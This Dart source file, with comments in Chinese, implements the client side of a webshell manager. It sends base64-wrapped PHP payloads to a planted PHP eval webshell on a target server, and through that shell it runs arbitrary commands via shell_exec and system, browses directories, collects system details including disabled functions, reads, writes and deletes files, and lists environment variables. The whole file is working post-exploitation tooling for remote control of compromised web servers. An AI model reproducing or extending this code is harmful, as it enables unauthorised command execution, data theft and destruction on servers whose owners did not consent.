import 'dart:async';
import 'dart:convert';

import 'package:http/http.dart' as http;

import '../models/webshell.dart';

/// Webshell 通信服务
/// 通过 HTTP POST/GET 向目标 PHP eval Webshell 发送代码并接收结果
class WebshellService {
  final Webshell webshell;
  String currentDir = '/';

  WebshellService(this.webshell);

  /// 发送 PHP 代码到 Webshell 并返回执行结果
  /// 使用 password 字段作为 POST 参数名（即 eval($_POST['password']) 模式）
  Future<String> _send(String phpCode) async {
    try {
      final uri = Uri.parse(webshell.url);
      final pass = (webshell.password?.isNotEmpty == true)
          ? webshell.password!
          : 'pass';

      http.Response response;

      if (webshell.method == 'GET') {
        final params = Map<String, String>.from(uri.queryParameters);
        params[pass] = phpCode;
        response = await http
            .get(uri.replace(queryParameters: params))
            .timeout(const Duration(seconds: 15));
      } else {
        response = await http.post(
          uri,
          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
          body: {pass: phpCode},
        ).timeout(const Duration(seconds: 15));
      }

      if (response.statusCode == 200) {
        return response.body;
      }
      return '[HTTP ${response.statusCode}] 请求失败';
    } on TimeoutException {
      return '[Timeout] 连接超时，请检查目标是否可达';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }

  /// 测试连接是否有效
  Future<bool> ping() async {
    try {
      final token = base64.encode(utf8.encode('MATRIX_PING'));
      final result =
          await _send("echo base64_decode('$token');").timeout(const Duration(seconds: 8));
      return result.contains('MATRIX_PING');
    } catch (_) {
      return false;
    }
  }

  /// 执行 Shell 命令（使用 base64 编码命令避免转义问题）
  Future<String> executeCommand(String cmd) async {
    final b64 = base64.encode(utf8.encode(cmd));
    final result = await _send(
      "\$c=base64_decode('$b64');"
      r"$o=@shell_exec($c.' 2>&1');"
      r"if($o===null){$o=@system($c);}echo $o;",
    );
    return result.trim();
  }

  /// 获取当前工作目录
  Future<String> getCurrentDir() async {
    final dir = await _send("echo getcwd();");
    final trimmed = dir.trim();
    if (trimmed.isNotEmpty && !trimmed.startsWith('[')) {
      currentDir = trimmed;
    }
    return currentDir;
  }

  /// 列出目录内容，返回 FileEntry 列表
  Future<List<FileEntry>> listDirectory(String path) async {
    final b64 = base64.encode(utf8.encode(path));
    final code = r'''
$p=base64_decode(')''' +
        b64 +
        r'''');
$d=@opendir($p);
if($d===false){echo "ERR_OPEN";exit;}
while(($f=readdir($d))!==false){
  $fp=$p.DIRECTORY_SEPARATOR.$f;
  $t=is_dir($fp)?'d':'f';
  $s=is_file($fp)?@filesize($fp):0;
  $m=date('Y-m-d H:i',@filemtime($fp));
  $r=decoct(@fileperms($fp)&0777);
  echo base64_encode($f).'|'.$t.'|'.$s.'|'.$r.'|'.$m."\n";
}
closedir($d);
''';
    final result = await _send(code);
    if (result.isEmpty ||
        result.startsWith('ERR_OPEN') ||
        result.startsWith('[')) {
      return [];
    }
    final entries = result
        .trim()
        .split('\n')
        .where((l) => l.contains('|'))
        .map((line) {
          final parts = line.trim().split('|');
          if (parts.length < 5) return null;
          String name;
          try {
            name = utf8.decode(base64.decode(parts[0]));
          } catch (_) {
            name = parts[0];
          }
          return FileEntry(
            name: name,
            isDirectory: parts[1] == 'd',
            size: int.tryParse(parts[2]) ?? 0,
            permissions: parts[3],
            modified: parts[4],
          );
        })
        .whereType<FileEntry>()
        .where((e) => e.name != '.')
        .toList()
      ..sort((a, b) {
        if (a.name == '..') return -1;
        if (b.name == '..') return 1;
        if (a.isDirectory != b.isDirectory) return a.isDirectory ? -1 : 1;
        return a.name.toLowerCase().compareTo(b.name.toLowerCase());
      });
    return entries;
  }

  /// 获取系统信息（base64 编码键值对）
  Future<Map<String, String>> getSystemInfo() async {
    const code = r'''
$info=[];
$info['OS']=php_uname();
$info['PHP版本']=phpversion();
$info['运行用户']=function_exists('posix_getpwuid')
  ? posix_getpwuid(posix_geteuid())['name']
  : get_current_user();
$info['当前目录']=getcwd();
$info['文档根目录']=isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'N/A';
$info['服务器软件']=isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'N/A';
$info['服务器IP']=isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:@gethostbyname(@gethostname());
$info['内存限制']=ini_get('memory_limit');
$info['最大执行时间']=ini_get('max_execution_time').'s';
$info['禁用函数']=ini_get('disable_functions')?:'无';
$info['Safe Mode']=(ini_get('safe_mode')||(bool)ini_get('safe_mode'))?'On':'Off';
$info['已加载扩展']=implode(', ',get_loaded_extensions());
foreach($info as $k=>$v){
  echo base64_encode($k).'|'.base64_encode((string)$v)."\n";
}
''';
    final result = await _send(code);
    final map = <String, String>{};
    if (result.isEmpty || result.startsWith('[')) return map;
    for (final line in result.trim().split('\n')) {
      final idx = line.indexOf('|');
      if (idx > 0) {
        try {
          final key = utf8.decode(base64.decode(line.substring(0, idx).trim()));
          final val = utf8.decode(base64.decode(line.substring(idx + 1).trim()));
          map[key] = val;
        } catch (_) {}
      }
    }
    return map;
  }

  /// 读取文件内容
  Future<String> readFile(String path) async {
    final b64 = base64.encode(utf8.encode(path));
    return await _send(
      "\$p=base64_decode('$b64');"
      r"echo file_exists($p)?file_get_contents($p):'[文件不存在或无权读取]';",
    );
  }

  /// 删除文件
  Future<bool> deleteFile(String path) async {
    final b64 = base64.encode(utf8.encode(path));
    final result = await _send(
      "\$p=base64_decode('$b64');"
      r"echo @unlink($p)?'1':'0';",
    );
    return result.trim() == '1';
  }

  /// 轻量目录列举，仅返回 (name, isDir)，用于 Tab 补全缓存
  Future<List<({String name, bool isDir})>> listNamesForCompletion(
      String path) async {
    final b64 = base64.encode(utf8.encode(path));
    final code = "\$p=base64_decode('$b64');"
        r"$d=@opendir($p);"
        r"if($d===false){exit;}"
        r"while(($f=readdir($d))!==false){"
        r"if($f==='.'||$f==='..'){continue;}"
        r"$t=is_dir($p.DIRECTORY_SEPARATOR.$f)?'d':'f';"
        r"echo base64_encode($f).'|'.$t.chr(10);"
        r"}closedir($d);";
    final result = await _send(code);
    if (result.isEmpty || result.startsWith('[')) return [];
    final out = <({String name, bool isDir})>[];
    for (final line in result.trim().split('\n')) {
      final parts = line.trim().split('|');
      if (parts.length < 2) continue;
      try {
        final name = utf8.decode(base64.decode(parts[0]));
        out.add((name: name, isDir: parts[1] == 'd'));
      } catch (_) {}
    }
    out.sort((a, b) => a.name.compareTo(b.name));
    return out;
  }

  /// 返回用户 HOME 目录，用于 ~ 路径展开
  Future<String> getHomeDir() async {
    final result = await _send(r"echo getenv('HOME');");
    return result.trim();
  }

  /// 返回环境变量名列表，用于 Tab 补全 $VAR
  Future<List<String>> listEnvVarNames() async {
    final result = await _send(
      r"foreach(array_keys((array)getenv()) as $k){echo $k.chr(10);}",
    );
    if (result.isEmpty || result.startsWith('[')) return [];
    return result.trim().split('\n').where((s) => s.isNotEmpty).toList()
      ..sort();
  }

  /// 写入/创建文件
  Future<bool> writeFile(String path, String content) async {
    final pathB64 = base64.encode(utf8.encode(path));
    final contentB64 = base64.encode(utf8.encode(content));
    final result = await _send(
      "\$p=base64_decode('$pathB64');"
      "\$c=base64_decode('$contentB64');"
      r"echo file_put_contents($p,$c)!==false?'1':'0';",
    );
    return result.trim() == '1';
  }
}

// ─── 文件条目模型 ──────────────────────────────────────────────────────────────

class FileEntry {
  final String name;
  final bool isDirectory;
  final int size;
  final String permissions;
  final String modified;

  const FileEntry({
    required this.name,
    required this.isDirectory,
    required this.size,
    required this.permissions,
    required this.modified,
  });

  String get formattedSize {
    if (isDirectory) return '--';
    if (size < 1024) return '$size B';
    if (size < 1024 * 1024) return '${(size / 1024).toStringAsFixed(1)} KB';
    if (size < 1024 * 1024 * 1024) {
      return '${(size / (1024 * 1024)).toStringAsFixed(1)} MB';
    }
    return '${(size / (1024 * 1024 * 1024)).toStringAsFixed(1)} GB';
  }
}
